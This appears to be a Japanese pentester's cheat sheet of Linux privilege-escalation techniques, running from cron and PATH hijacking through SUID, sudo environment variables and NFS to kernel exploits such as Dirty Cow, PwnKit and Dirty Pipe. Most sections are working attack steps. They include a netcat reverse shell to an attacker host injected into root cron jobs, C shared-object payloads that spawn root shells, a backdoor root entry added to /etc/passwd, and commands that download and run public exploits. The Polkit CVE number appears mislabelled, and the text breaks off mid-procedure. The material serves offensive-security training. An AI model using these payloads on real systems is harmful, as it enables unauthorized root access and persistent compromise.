- 関連ノート：
    - [🔍Linux Enumeration](https://claude.ai/chat/%F0%9F%94%8DLinux%20Enumeration.md)
    - パーミッションについての基本事項：[権限関連の知識、コマンド](https://claude.ai/Common/%E6%A8%A9%E9%99%90%E9%96%A2%E9%80%A3%E3%81%AE%E7%9F%A5%E8%AD%98%E3%80%81%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89.md)

---

# Cronを利用したPrivEsc

高権限でファイルを定期的に実行しているcronを悪用する。

## Cron w/ Writable File

- 条件：
    - root権限で動作しているcron
    - 書き込み権限（`w`）のある実行可能ファイルを実行している
    - 実行間隔がテストに使える時間の範囲内（実行間隔が短い）

1. [🔍Linux Enumeration](https://claude.ai/chat/%F0%9F%94%8DLinux%20Enumeration.md#Cron%E3%81%AE%E5%88%97%E6%8C%99%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89)で条件を満たすcronを検索
	
2. [What is the shell](https://claude.ai/Common/What%20is%20the%20shell.md#%E5%90%8D%E5%89%8D%E4%BB%98%E3%81%8D%E3%83%91%E3%82%A4%E3%83%97%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%9Fnetcat%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%B7%E3%82%A7%E3%83%AB)のペイロードを実行可能ファイルに追記する
    

```zsh
# ファイルの存在確認 & 空白行を挿入してペイロード注入の影響を低減
echo >> <file.sh>
```

```zsh
echo "mkfifo /tmp/f; nc <attacker_IP> <port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <file.sh>
```

```zsh
chmod +x <file.sh>
```

3. 攻撃者マシン上でリバースシェルリスナーを用意し、ターゲット上でcronが実行されるのを待つ

---

## Cron w/ PATH変数

- 条件：
    - root権限で動作しているcron
    - 実行可能ファイルがフルパス指定ではなく、**相対パス（relative path）指定**
    - 実行間隔がテストに使える時間の範囲内（実行間隔が短い）

1. cronのPATH変数を確認する

```zsh
cat /etc/crontab
```

↓出力例

![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230626210329.png)

2. [🔍Linux Enumeration](https://claude.ai/chat/%F0%9F%94%8DLinux%20Enumeration.md#Cron%E3%81%AE%E5%88%97%E6%8C%99%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89)で実行ファイル（.sh）を実行するcronを探す
    
3. 実行ファイルがフルパスでないことを確認
    
    - 例：
        - ✅ `pwd`（相対パス → 攻撃対象）
        - ❌ `/usr/sbin/pwd`（フルパス → 攻撃不可）
4. 本来の実行ファイルのフルパスよりも前に指定されているPATHディレクトリが書き込み可能かどうかを確認
    
    - PATH変数の編集には一般的にroot権限が必要なので、ディレクトリへの書き込み権限の確認にとどめる

```zsh
ls -la <directory>
```

5. 書き込み可能かつPATH変数に含まれるディレクトリに、手順2で見つけた実行ファイルと同じファイル名のペイロードを作成する

```zsh
cd <directory>
echo "mkfifo /tmp/f; nc <attacker_IP> <port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <同じ名前のfile.sh>
```

```zsh
chmod +x <同じ名前のfile.sh>
```

6. リバースシェルリスナーを用意し、cronの実行を待つ

### 補足：systemdの場合

- LinPEASの結果の`Systemd Information`セクションに以下のように表示されることがある

![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020260214172732.png)

- 使用しているサービス（systemd）によって実行されるコマンドが相対パスで指定されている場合は、[Cron w/ PATH変数](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#Cron%20w/%20PATH%E5%A4%89%E6%95%B0)と同じ原理で攻撃できる

> [!NOTE] LinPEASは引数もコマンドと誤検知することがある。上記画像で `apache2.service: Uses relative path 'start'` と表示されているが、`start` はコマンドではなく引数であり、攻撃対象にはならない

---

---

# `/etc/passwd`認証を利用したPrivEsc

- 方法：`/etc/passwd` に直接パスワードハッシュを書き込む
    - `/etc/passwd` の第二フィールドに `x` ではなくパスワードハッシュが記載されている場合、`/etc/shadow` よりも優先される仕様がある
- 条件：`/etc/passwd` が書き込み可能

1. パスワードハッシュを生成する

```zsh
openssl passwd <password>
```

> [!NOTE] `openssl` は通常デフォルトでLinuxがサポートするハッシュアルゴリズムでハッシュ化するが、システムによってはサポートされないアルゴリズムを使うことがある。その場合は[補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#%E8%A3%9C%E8%B6%B3%EF%BC%9Aopenssl%E3%81%8C%E3%82%B5%E3%83%9D%E3%83%BC%E3%83%88%E3%81%95%E3%82%8C%E3%81%AA%E3%81%84%E3%83%8F%E3%83%83%E3%82%B7%E3%83%A5%E3%82%A2%E3%83%AB%E3%82%B4%E3%83%AA%E3%82%BA%E3%83%A0%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%97%E3%81%BE%E3%81%86%E3%81%A8%E3%81%8D)を参照

2. `/etc/passwd` に任意のユーザー名と生成したパスワードハッシュの組み合わせを追記する

```zsh
echo '<username>:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
```

3. 作成したユーザーに`su`する

```zsh
su <username>
```

## 補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき

1. ターゲットシステムがサポートしているハッシュアルゴリズムを確認する

```zsh
cat /etc/login.defs | grep ENCRYPT_METHOD
```

↓出力例

```
# This variable is deprecated. You should use ENCRYPT_METHOD.
ENCRYPT_METHOD SHA512
```

2. opensslで利用可能なアルゴリズムを調べて、対応するオプションでハッシュを生成する

```zsh
openssl passwd --help
```

```zsh
# SHA-512の場合（-6 オプション）
openssl passwd -6 <password>
```

3. 出力されたパスワードハッシュを `/etc/passwd` に書き込む

> [!NOTE]
> 
> - 出力されたハッシュを**すべてコピー**すること
> - `$` が含まれる場合、ダブルクォーテーションで囲まないこと（シェル変数として展開され、ハッシュが壊れる）

---

---

# SUIDとCapabilityを利用したPrivEsc

> [!NOTE] SGIDの場合は、バイナリの所有グループに属するユーザーへのLateral Movementが可能

## SUIDバイナリ w/ 公開エクスプロイト

1. [🔍Linux Enumeration](https://claude.ai/chat/%F0%9F%94%8DLinux%20Enumeration.md#%E9%AB%98%E6%A8%A9%E9%99%90%E3%82%92%E3%82%82%E3%81%A4%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%81%AE%E5%88%97%E6%8C%99)を実施
2. [GTFOBins](https://gtfobins.github.io/)で対象バイナリを検索 → "SUID" もしくは "Capability" に記載のコマンドを（説明を読んだ上で）実行
    - SGIDがあるバイナリに対してもSUIDのテクニックが使える
    - GTFOBinsの方法でPermission deniedになる場合は[補足：GTFOBinsの方法でPermission deniedの場合の原因追求](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#%E8%A3%9C%E8%B6%B3%EF%BC%9AGTFOBins%E3%81%AE%E6%96%B9%E6%B3%95%E3%81%A7Permission%20denied%E3%81%AE%E5%A0%B4%E5%90%88%E3%81%AE%E5%8E%9F%E5%9B%A0%E8%BF%BD%E6%B1%82)を参照

> [!TIP] バイナリのバージョンによっては、Exploit-DBに公開エクスプロイトが存在する場合がある

---

## SUIDバイナリ w/ PATH変数

- 方法：PATH環境変数を操作して、SUIDバイナリに攻撃者が作成した実行ファイルを実行させる
- PATH環境変数は実行可能プログラムを格納するディレクトリを指定する変数で、コマンド実行時にこの変数を参照してファイルを検索する
- 条件：
    - SUIDバイナリがコマンドを実行しているが、コマンドが絶対パス指定ではない
        - 例：`/usr/bin/pwd` ではなく `pwd`
    - 書き込み可能なディレクトリがPATH内に存在する、またはPATH変数自体を変更可能

### 事前調査

脆弱性の有無を判断するため、以下4点を確認する。

1. PATH変数のディレクトリを確認する

```zsh
echo $PATH
```

2. システム全体から書き込み可能なディレクトリを列挙し、PATH変数内のディレクトリに書き込み権限があるかを確認する

```zsh
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

3. またはPATH変数を変更できるかを確認する

```zsh
# バックアップ
echo $PATH >> PATH.bkup
# 変更試行
export PATH=$PATH:/test
echo $PATH
# 切り戻し
cat PATH.bkup
export PATH=<PATH.bkupの中身>
```

> [!NOTE] 切り戻し時は `echo PATH.bkup` ではなく `cat PATH.bkup` でファイルの中身を確認してから値を設定すること

4. [🔍Linux Enumeration](https://claude.ai/chat/%F0%9F%94%8DLinux%20Enumeration.md#%E9%AB%98%E6%A8%A9%E9%99%90%E3%82%92%E3%82%82%E3%81%A4%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%81%AE%E5%88%97%E6%8C%99)で検出したSUIDバイナリが、フルパスを使わずにコマンドを呼び出しているかを確認する
    - 実際にバイナリを動作させてエラーメッセージからコマンドを推測するか、`strings` コマンドで文字列を抽出してコマンドを確認する

### パターンA：書き込み可能なディレクトリがPATH内に存在する場合

1. 書き込み可能なPATHディレクトリに、SUIDバイナリが呼び出しているコマンドと同じ名前の偽コマンドを作成する

```zsh
cd <書き込み可能なPATHディレクトリ>
echo "/bin/bash" > <コマンド名>
chmod +x <コマンド名>
```

2. SUIDバイナリを実行する

```zsh
./<SUID_binary>
```

→ バイナリのowner権限で `/bin/bash` が実行される

### パターンB：PATH変数が変更可能な場合

1. 元のPATH変数をバックアップしておく

```zsh
echo $PATH
```

2. PATH変数を変更する（全ユーザーに書き込み権限がある `/tmp` を先頭に追加するのが一般的）

```zsh
export PATH=/tmp:$PATH
```

3. `/tmp` に偽のコマンドを作成する

```zsh
cd /tmp
echo "/bin/bash" > <コマンド名>
chmod +x <コマンド名>
```

4. SUIDバイナリを実行する

```zsh
./<SUID_binary>
```

→ バイナリのowner権限で `/bin/bash` が実行される。実行後はPATH変数を元に戻すこと

---

## SUID w/ Shared Object（.so）Injection

- 方法：悪意ある共有オブジェクトを注入して任意の処理を実行させる
- 条件：
    - rootのSUIDがセットされた実行ファイルが、存在しない共有オブジェクト（.so）を参照している
    - その「存在しない共有オブジェクト」が置かれるべきディレクトリが書き込み可能

1. SUIDバイナリの動作をトレースし、存在しない共有オブジェクトを参照していないかを確認する

```zsh
strace <SUID_binary> 2>&1 | grep -iE "open|access|no such file"
```

- 拡張子が `.so` のファイルに対して `No such file or directory` が出ていればOK

![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230627095059.png)

$$参照する共有オブジェクトが存在しないエラーが表示（libcalc.so）$$

2. 「存在しない共有オブジェクト」のディレクトリを作成する（用意できない場合は他の共有オブジェクトをあたる）

```zsh
# 上記の例の場合：mkdir /home/user/.config
mkdir <directory>
```

3. ペイロードを用意する（ファイル名は任意だが `shell.c` とする）

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

4. SUIDバイナリが参照している「存在しない共有オブジェクト」と同じファイルパスでコンパイルする

```zsh
gcc -fPIC -shared -o <共有オブジェクトファイルのフルパス> shell.c
```

5. SUIDバイナリを実行すると権限昇格できる

---

## SUID w/ Bash <= 4.2-048

Shellshockと呼ばれる手法。

- 条件：
    - Bashのバージョンが4.2-048以下
    - rootのSUIDバイナリがコマンドを実行している

1. Bashのバージョンを確認する

```zsh
/bin/bash --version
```

2. SUIDバイナリの中身を確認し、実行しているコマンドのパスを調べる

```zsh
strings <SUIDバイナリのパス>
```

↓出力例

```
/usr/sbin/service apache2 start...
```

3. 実行コマンドのフルパスと同名のBash関数を定義してエクスポートする

```zsh
# 上記の出力の場合
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

4. SUIDバイナリを実行する

---

## SUID w/ Bash <= 4.3

🔗[CVE-2016-7543](https://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-006966.html)

> [!NOTE] バージョンが4.3以下であっても、パッチの適用状況やディストリビューションによってはこのエクスプロイトが成功しない場合がある。その場合は[SUID w/ Bash <= 4.2-048](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#SUID%20w/%20Bash%20%3C=%204.2-048)の手法を試すこと

- 条件：
    - Bashのバージョンが4.3以下
    - rootのSUIDバイナリがコマンドを実行している

1. Bashのバージョンを確認する

```zsh
/bin/bash --version
```

2. bashデバッグを有効にし、PS4変数にSUIDがセットされた `/bin/bash` のコピーを作成するコマンドを設定して実行する

```zsh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <SUID_binary>
```

3. 作成されたバイナリを実行して高権限シェルを獲得する

```zsh
/tmp/rootbash -p
```

> [!NOTE] `-p` オプションを付けることでSUIDを維持したまま起動できる。付けないと実効UIDがリセットされる

---

---

# Sudoを利用したPrivEsc

## Sudo権限 w/ GTFOBins

1. [🔍Linux Enumeration](https://claude.ai/chat/%F0%9F%94%8DLinux%20Enumeration.md#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E6%83%85%E5%A0%B1%E3%83%BB%E3%83%9B%E3%82%B9%E3%83%88%E5%90%8D%E3%81%AE%E5%88%97%E6%8C%99%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89)でsudo権限を確認する

```zsh
sudo -l
```

2. [GTFOBins](https://gtfobins.github.io/)で対象バイナリを検索 → `Sudo` に記載のコマンドを（説明を読んだ上で）実行する
    - GTFOBinsの方法でPermission deniedになる場合は[補足：GTFOBinsの方法でPermission deniedの場合の原因追求](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#%E8%A3%9C%E8%B6%B3%EF%BC%9AGTFOBins%E3%81%AE%E6%96%B9%E6%B3%95%E3%81%A7Permission%20denied%E3%81%AE%E5%A0%B4%E5%90%88%E3%81%AE%E5%8E%9F%E5%9B%A0%E8%BF%BD%E6%B1%82)を参照

### 補足：GTFOBinsの方法でPermission deniedの場合の原因追求

以下が原因の場合、対策として他のバイナリを使うか、別の攻撃ベクターを検討する。

**原因1：一部のオプションのみがsudoで実行可能で、GTFOBinsに記載のオプションが使えない**

- 例：`sudo -l` の結果が以下の場合、`crontab -l` のみ実行可能

```
...(ALL) (ALL) /usr/bin/crontab -l
```

**原因2：AppArmorやClamAVなどのセキュリティ機構がGTFOBinsのコマンドを遮断している**

- AppArmorはDebian 10以降でデフォルト有効
- syslogでauditデーモンのログを確認し、AppArmorが動作していることを確認する

```zsh
cat /var/log/syslog | grep <binary名（例：tcpdump）>
```

↓出力例

```
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump"
```

---

## Sudo権限 w/ 環境変数

### 条件

1. `sudo -l` の結果に表示されたコマンドがGTFOBinsに載っていない
2. そのコマンドが共有オブジェクトを動的リンクしている

```zsh
file <path_to_binary>
```

- 例：`ELF 64-bit LSB shared object, x86-64, ...` → ✅ 動的リンク（攻撃可能）
- 例：`statically linked` または `statically linked, stripped` → ❌ 静的リンク（LD_PRELOADは効かない）

3. `sudo -l` の出力に `env_reset` があり、さらに `env_keep` に以下のいずれかが含まれている

|環境変数|環境変数の目的|任意コード実行の仕組み|
|---|---|---|
|`LD_PRELOAD`|このライブラリを必ず最初に読み込む、と指定|コマンド実行時、リンカが `LD_PRELOAD` に設定された共有オブジェクトを優先的に読み込むため（フック＝横取り）、攻撃者が用意した悪意ある共有オブジェクトを先に読み込ませて任意コードを実行できる|
|`LD_LIBRARY_PATH`|どのディレクトリを先に探すかという検索順を操作|コマンド実行時、リンカが `LD_LIBRARY_PATH` に指定されたディレクトリを順に検索するため、ターゲットが依存する共有ライブラリ名（SONAME）と同じ名前の .so を先に置いておけば任意コードを呼べる|

![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230626181707.png)

### LD_PRELOADの場合

参考：[LD_PRELOAD and NOPASSWD - PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd)

1. ペイロードを用意する（ファイル名は任意だが `shell.c` とする）

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/sh");
}
```

2. コンパイルする

```zsh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3. `sudo -l` で出力されたバイナリを `<program_name>` に代入して実行する

```zsh
# 例：sudo LD_PRELOAD=/tmp/shell.so find
sudo LD_PRELOAD=/tmp/shell.so <program_name>
```

### LD_LIBRARY_PATHの場合

> [!NOTE] 偽の共有オブジェクトを作成するため、本来の共有オブジェクトをリンクする他のバイナリにも影響が出る可能性がある。可能であれば LD_PRELOAD の方が安全

1. `sudo -l` で出力されたバイナリが依存する共有ライブラリを確認する

```zsh
ldd <バイナリのフルパス（例：/usr/sbin/apache2）>
```

↓出力例

```
libuuid.so.1 => /lib/libuuid.so.1 (0x00007f609dc24000)
librt.so.1 => /lib/librt.so.1 (0x...)
libcrypt.so.1 => /lib/libcrypt.so.1 (0x...)
```

2. 手順1でリストされたライブラリのいずれかと同じ名前の悪意ある共有オブジェクトを作成する

```c
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```zsh
gcc -o /tmp/<ライブラリ名（例：libcrypt.so.1）> -shared -fPIC <上記Cコードへのパス>
```

3. `LD_LIBRARY_PATH` に `/tmp` を指定した上でバイナリを実行する

```zsh
sudo LD_LIBRARY_PATH=/tmp <binary（例：apache2）>
```

---

---

# NFSを利用したPrivEsc

- 方法：攻撃者マシン上でroot権限により作成した悪意あるSUIDバイナリを、ターゲットマシンの共有フォルダに配置し、ターゲットの低権限ユーザーで実行する
- 条件：
    - NFSが設定されている
    - NFSの中に書き込み可能なディレクトリがあり、かつ `no_root_squash` が設定されている

> [!NOTE] `no_root_squash` は、クライアント側のroot権限をサーバー側でもそのまま有効にするNFSオプション。デフォルトではroot権限は制限されるが、このオプションが有効な場合、攻撃者はroot権限でファイルを作成・操作できる

1. ターゲットマシン上でNFSの設定を確認する

```zsh
cat /etc/exports
```

- `no_root_squash` が設定されているディレクトリを確認する

2. `no_root_squash` が設定されているディレクトリが一般ユーザーにも書き込み可能かどうかを確認する

```zsh
ls -la <directory_full_path>
```

3. 攻撃者マシン上でマウントポイントを作成し、ターゲットの書き込み可能な共有フォルダをマウントする

```zsh
sudo su
mkdir /tmp/nfs
mount -o rw,vers=3 <target_IP>:<writable_directory_full_path> /tmp/nfs
```

4. ペイロードを生成し、マウントしたフォルダに保存する

```zsh
msfvenom -p linux/<architecture>/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

5. ペイロードにSUIDと実行権限を付与する

```zsh
chmod +xs /tmp/nfs/shell.elf
```

6. ターゲットマシン上で生成したペイロードを実行し、権限昇格する

```zsh
<writable_directory_full_path>/shell.elf
```

---

---

# カーネルの脆弱性を利用したPrivEsc

[🔍Linux Enumeration](https://claude.ai/chat/%F0%9F%94%8DLinux%20Enumeration.md#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E6%83%85%E5%A0%B1%E3%81%AE%E5%88%97%E6%8C%99)

## 脆弱性を利用するにあたって

- 公開エクスプロイトを使用するには、カーネルバージョンとOSのディストリビューションが一致している必要がある
- 互換性を保つため、ターゲットマシン上でコンパイルするのがベスト
    - gccなどのコンパイラがない場合は、攻撃者マシンやターゲット環境を模した環境でコンパイルして転送する

> [!NOTE] カーネルエクスプロイトの列挙にSearchsploitを使うと非効率なことが多いため、LinPEAS.shを使用する。LinPEASの結果の `Executing Linux Exploit Suggester` セクションを確認すること

- SearchSploitでの公開エクスプロイト検索手法：

```zsh
# 例：searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
searchsploit "linux kernel <ディストリビューション> <メジャーバージョン> Local Privilege Escalation"
```

- `grep` や `grep -v`（除外）で対象バージョンに合うものを絞り込む

---

## 確認必須事項：パッチのバックポート有無

> [!WARNING] カーネルバージョンとディストロが一致していて公開エクスプロイトが利用可能に見えても、バックポート（より新しいバージョン用のパッチを古いバージョンに適用すること）によって対象CVEへのパッチが当たっていることがある。必ず公式サイトで確認してから使うこと

> [!TIP] 以下の手順のショートカット：Googleで以下のように検索すると直接セキュリティ情報ページにたどり着ける
> 
> ```
> # 例：site:ubuntu.com "USN" CVE-2016-5195
> site:<ディストロのドメイン名> "<セキュリティリリース情報名>"
> ```
> 
> セキュリティリリース情報名は `<ディストロ名> Security Notice` で検索すると確認できる

1. ディストロごとの公式CVE・セキュリティ情報ページを特定する
    
    - Ubuntu: [Ubuntu CVE Tracker](https://ubuntu.com/security/cve), [USN](https://ubuntu.com/security/notices)
    - Debian: [Debian Security Tracker](https://security-tracker.debian.org/tracker/)
    - Red Hat / CentOS / Fedora: [Red Hat CVE Database](https://access.redhat.com/security/security-updates/cve)
    - SUSE / openSUSE: [SUSE Security Announcements](https://www.suse.com/support/security/)
    - Arch Linux: [Arch Security Advisories](https://security.archlinux.org/)
2. 該当CVEを検索する
    
3. 表示されたページで修正済みバージョンや関連セキュリティアドバイザリを確認する
    
    - 各ディストロは _Security Notice / Advisory_ と呼ばれる修正通知を発行している
    - 通知ページには「修正が含まれるパッケージ（カーネル）」のバージョンが記載されている
    - → そこに載っているバージョン **以上** であれば修正済みと判断する

![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020250909131226.png)

$$USNの修正済みバージョン情報$$

---

## 主なカーネルエクスプロイト

### カーネルエクスプロイト一覧表

|エクスプロイト|対象ディストロ|対象カーネル|備考 / コメント|
|---|---|---|---|
|[Dirty Cow (CVE-2016-5195)](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#Dirty%20Cow%20\(CVE-2016-5195\))|ほぼ全Linux|2.x ～ 4.8.2|カーネル依存型。ディストロごとのバックポートは要確認。g++の有無でコンパイル方法が変わる|
|[PwnKit (CVE-2021-4034)](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#PwnKit%20\(CVE-2021-4034\))|Ubuntu 10–21.10 / Debian 7–11 / RedHat 6.0–8.4（Fedora / CentOSも可能性あり）|すべてのカーネル|pkexec / polkit < 0.120 に依存。ディストロごとのパッケージバージョンで判定。**使いやすい**|
|[Get-Rekt BPF (CVE-2017-16995)](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#Get-Rekt%20BPF%20\(CVE-2017-16995\))|Debian 9 / Ubuntu 14.04–16.04 / Mint 17–18 / Fedora 25–27|4.4.0 – 4.14.10|カーネル依存型|
|[Dirty Pipe (CVE-2022-0847)](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#Dirty%20Pipe%20\(CVE-2022-0847\))|Ubuntu 20.04–21.04 / Debian 11 / RHEL 8.0–8.4 / Fedora 35|5.8.x以上（修正済：5.16.11, 5.15.25, 5.10.102）|カーネル依存型。ターゲットカーネルが修正済みかを確認すること|
|[Polkit (CVE-2021-2560)](https://www.exploit-db.com/exploits/50011)|Ubuntu 20.04 / 20.10 / Debian 11 / RHEL 8.x / Fedora 33|すべてのカーネル|2021年頃の比較的新しい環境が対象。D-Busの応答切断タイミングを利用した論理バグ。GUI環境がなくても成立する|
|[sudo Baron Samedit (CVE-2021-3156)](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#sudo%20Baron%20Samedit\(CVE-2021-3156\))|ほぼ全ディストロ（sudo使用環境）|すべてのカーネル|カーネル非依存（sudoのバージョン依存）。sudo 1.8.2 ～ 1.8.31p2 / 1.9.0 ～ 1.9.5p1 が対象。ヒープオーバーフロー|

---

### Dirty Cow (CVE-2016-5195)

#### ターゲットでg++が使える場合

1. 攻撃者マシン上で公開エクスプロイトをコピーし、ターゲットに転送する

```zsh
searchsploit -m 40847
python -m http.server 8080
```

2. ターゲットマシン上にダウンロードし、コンパイルして実行する

```zsh
wget http://<attacker_IP>:8080/40847.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s
```

#### ターゲットでg++が使えない場合

1. 攻撃者マシン上で公開エクスプロイトをコピーし、ターゲットに転送する

```zsh
searchsploit -m 40839
python -m http.server 8080
```

2. ターゲットマシン上にダウンロードし、コンパイルして実行する

```zsh
wget http://<attacker_IP>:8080/40839.c -O dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <任意のパスワード>
```

3. 実行後は `/etc/passwd` を復元すること

```zsh
mv /tmp/passwd.bak /etc/passwd
```

---

### PwnKit (CVE-2021-4034)

1. pkexecの存在とSUIDビットを確認する

```zsh
ls -l /usr/bin/pkexec
```

→ パーミッションに `-rwsr-xr-x` のように `s`（SUID）が含まれていれば攻撃対象の可能性がある

2. インストールされているpolkitのバージョンを確認する

```zsh
dpkg -s policykit-1 | grep Version
```

→ 出力を[ディストロごとの vulnerable / fixed バージョン](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#%E3%83%87%E3%82%A3%E3%82%B9%E3%83%88%E3%83%AD%E3%81%94%E3%81%A8%E3%81%AE%20vulnerable%20/%20fixed%20%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3)と照合する

3. 脆弱なバージョンであればエクスプロイトを実行する

```zsh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit
chmod +x pwnkit
./pwnkit         # 対話型シェルを取得
./pwnkit 'id'    # 単発コマンド実行
```

→ システムが修正済みの場合は、失敗した旨が明示的に通知される

#### ディストロごとの vulnerable / fixed バージョン

参考：[The PwnKit vulnerability: Overview, detection, and remediation](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)

|Ubuntu version|Latest vulnerable version|First fixed version|
|---|---|---|
|14.04 LTS|0.105-4ubuntu3.14.04.6|0.105-4ubuntu3.14.04.6+esm1|
|16.04 LTS|0.105-14.1ubuntu0.5|0.105-14.1ubuntu0.5+esm1|
|18.04 LTS|0.105-20|0.105-20ubuntu0.18.04.6|
|20.04 LTS|0.105-26ubuntu1.1|0.105-26ubuntu1.2|

|Debian version|Latest vulnerable version|First fixed version|
|---|---|---|
|Stretch|0.105-18+deb9u1|0.105-18+deb9u2|
|Buster|0.105-25|0.105-25+deb10u1|
|Bullseye|0.105-31|0.105-31+deb11u1|
|unstable|0.105-31.1~deb12u1|0.105-31.1|

---

### Get-Rekt BPF (CVE-2017-16995)

1. 攻撃者マシン上で公開エクスプロイトをコピーし、ターゲットに転送する

```zsh
searchsploit -m 45010
python -m http.server 8080
```

2. ターゲット上にダウンロードし、コンパイルして実行する

```zsh
wget http://<attacker_IP>:8080/45010.c -O cve-2017-16995.c
gcc cve-2017-16995.c -o cve-2017-16995
./cve-2017-16995
```

> [!NOTE] 元のノートではコンパイル後に実行コマンドが抜けていたため補足した

---

### Dirty Pipe (CVE-2022-0847)

1. 攻撃者マシン上でエクスプロイトを取得し、ターゲットに転送する

```zsh
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
python -m http.server 8080
```

2. ターゲットマシン上にダウンロードし、コンパイルして実行する

```zsh
wget http://<attacker_IP>:8080/exploit.c
# コンパイルが失敗する場合は、攻撃者マシン上で gcc -static でコンパイルして転送する
# static でコンパイルした場合は実行時にエラーが表示されることがあるが、実際には成功していることが多い
gcc exploit.c -o exploit
./exploit
```

3. エクスプロイトの成否を確認し、rootに権限昇格する

> [!NOTE] `su: must be run from a terminal` や `system() function call seems to have failed :(` が表示されても成功している可能性が高い

```zsh
grep root /etc/passwd
```

↓出力例

```
root:$1$aaron$abcdefghijk...:0:0:root:/root:/bin/bash
```

```zsh
# パスワード：aaron
su -
```

4. root権限を得た状態で `/etc/passwd` を復元する

```zsh
mv /tmp/passwd.bak /etc/passwd
```

---

### Polkit (CVE-2021-2560)

1. Polkitの稼働状況を確認する

```zsh
systemctl status polkit
```

2. 脆弱なバージョンかどうかを判定する

```zsh
# Debian/Ubuntu系
dpkg -s policykit-1 | grep Version
# RHEL/CentOS系
rpm -qa polkit
```

- 主な脆弱バージョンの目安：
    - Ubuntu 20.04：polkit < 0.105-26ubuntu0.3
    - RHEL 8.x：polkit < 0.115-11.el8_4.1

3. エクスプロイトをダウンロードする

```zsh
searchsploit -m 50011
```

4. 実行する

```zsh
./50011.sh
```

> [!NOTE] 失敗した場合、`[*] Attempting to create account` でハングする

---

### sudo Baron Samedit (CVE-2021-3156)

🔗 https://github.com/worawit/CVE-2021-3156

1. sudoのバージョンを確認する

```sh
sudo --version
```

→ 先頭行のバージョンが以下の範囲であれば脆弱な可能性がある

- 1.8.2 ～ 1.8.31p2
- 1.9.0 ～ 1.9.5p1

2. ディストロによってはバックポート修正されているため、パッケージのリビジョンも確認する

```sh
# Debian / Ubuntu の場合
dpkg -l sudo
# RHEL / CentOS / Fedora の場合
rpm -qa | grep sudo
```

→ 出力を[ディストロごとの vulnerable / fixed バージョン](https://claude.ai/chat/154ce50b-1d75-4193-a686-e8b12aeb24cd#%E3%83%87%E3%82%A3%E3%82%B9%E3%83%88%E3%83%AD%E3%81%94%E3%81%A8%E3%81%AEvulnerable%20/%20fixed%20%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3)と照合する

3. エクスプロイトを実行する

